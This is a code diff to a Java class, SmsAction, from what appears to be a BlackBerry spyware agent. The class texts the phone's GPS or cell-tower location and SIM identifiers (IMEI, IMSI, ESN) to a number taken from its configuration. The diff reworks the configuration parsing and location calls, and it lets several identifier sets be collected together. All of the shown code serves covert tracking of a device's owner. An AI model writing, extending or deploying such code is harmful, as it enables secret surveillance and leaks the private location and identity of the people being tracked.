@@ -8,29 +8,25 @@
  * *************************************************/
 package blackberry.action;
 
-import java.io.EOFException;
-
-import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
-import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
+import blackberry.SMSHelper;
+import blackberry.Trigger;
+import blackberry.config.ConfAction;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-import blackberry.sms.SMSHelper;
 import blackberry.utils.Utils;
-import blackberry.utils.WChar;
 
 /**
  * The Class SmsAction.
@@ -48,24 +44,15 @@ public final class SmsAction extends SubAction implements LocationObserver {
     String text;
     int type;
 
-    /**
-     * Instantiates a new sms action.
-     * 
-     * @param actionId_
-     *            the action id_
-     * @param confParams
-     *            the conf params
-     */
-    public SmsAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
+    public SmsAction(final ConfAction params) {
+        super( params);
     }
 
     /*
      * (non-Javadoc)
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
-    public boolean execute(final Event triggeringEvent) {
+    public boolean execute(final Trigger triggeringEvent) {
 
         try {
             switch (type) {
@@ -76,7 +63,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                     if (!getGPSPosition()) {
-                        errorLocation();
+                        errorLocation(false);
                     }
 
                     break;
@@ -161,31 +148,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     private boolean getGPSPosition() {
-
-        LocationProvider lp = null;
-        final Criteria criteria = new Criteria();
-        criteria.setCostAllowed(true);
-
-        criteria.setHorizontalAccuracy(50);
-        criteria.setVerticalAccuracy(50);
-        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
-
-        try {
-            lp = LocationProvider.getInstance(criteria);
-        } catch (final Exception e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            //#endif
-            return false;
-        }
-
-        if (lp == null) {
-            //#ifdef DEBUG
-            debug.error("GPS Not Supported on Device");
-            //#endif               
-            return false;
-        }
-
+      
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
@@ -194,7 +157,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
         }
 
         synchronized (this) {
-            LocationHelper.getInstance().locationGPS(lp, this, true);
+            LocationHelper.getInstance().start( this, true);
         }
 
         return true;
@@ -220,7 +183,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
             //#ifdef DEBUG
             debug.error("Cannot get QualifiedCoordinates");
             //#endif                        
-            errorLocation();
+            errorLocation(false);
         }
 
         final StringBuffer sb = new StringBuffer();
@@ -231,7 +194,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     }
 
-    public synchronized void errorLocation() {
+    public void errorLocation(boolean interrupted) {
         //#ifdef DEBUG
         debug.error("Cannot get Location");
         //#endif  
@@ -243,7 +206,9 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     boolean waitingForPoint;
 
-    public synchronized void waitingForPoint(boolean b) {
+    private String descrType;
+
+    public void waitingForPoint(boolean b) {
         waitingForPoint = b;
     }
 
@@ -284,27 +249,30 @@ public final class SmsAction extends SubAction implements LocationObserver {
      * (non-Javadoc)
      * @see blackberry.action.SubAction#parse(byte[])
      */
-    protected boolean parse(final byte[] confParams) {
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
+    protected boolean parse(final ConfAction params) {
         try {
-            type = databuffer.readInt();
+            number = Utils.unspace( params.getString("number"));
+            descrType = params.getString("type");
+            if("location".equals(descrType)){
+                type=TYPE_LOCATION;
+            }else if("text".equals(descrType)){
+                type=TYPE_TEXT;             
+            }else if("sim".equals(descrType)){
+                type=TYPE_SIM;
+            }else{
+                //#ifdef DEBUG
+                debug.error("parse Error, unknown type: " + descrType);
+                //#endif
+                return false;
+            }
 
             //#ifdef DBC
             Check.asserts(type >= 1 && type <= 3, "wrong type");
             //#endif
 
-            int len = databuffer.readInt();
-            byte[] buffer = new byte[len];
-            databuffer.read(buffer);
-            number = Utils.Unspace(WChar.getString(buffer, true));
-
             switch (type) {
                 case TYPE_TEXT:
-                    len = databuffer.readInt();
-                    buffer = new byte[len];
-                    databuffer.read(buffer);
-                    text = WChar.getString(buffer, true);
+                    text = params.getString("text");
                     break;
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
@@ -318,10 +286,12 @@ public final class SmsAction extends SubAction implements LocationObserver {
                         sb.append("ESN: "
                                 + NumberUtilities.toString(device.getEsn(), 16)
                                 + "\n");
-                    } else if (Device.isGPRS()) {
+                    } 
+                    if (Device.isGPRS()) {
                         sb.append("IMEI: " + device.getImei() + "\n");
                         sb.append("IMSI: " + device.getImsi() + "\n");
-                    } else if (Device.isIDEN()) {
+                    } 
+                    if (Device.isIDEN()) {
                         //#ifdef DEBUG
                         debug.error("SmsAction: IDEN not supported");
                         //#endif
@@ -336,8 +306,11 @@ public final class SmsAction extends SubAction implements LocationObserver {
                     break;
             }
 
-        } catch (final EOFException e) {
-
+        } catch (final ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse");
+            //#endif
             return false;
         }
 
@@ -353,6 +326,6 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
         return sb.toString();
     }
-    //#endifSS
+    //#endif
 
 }
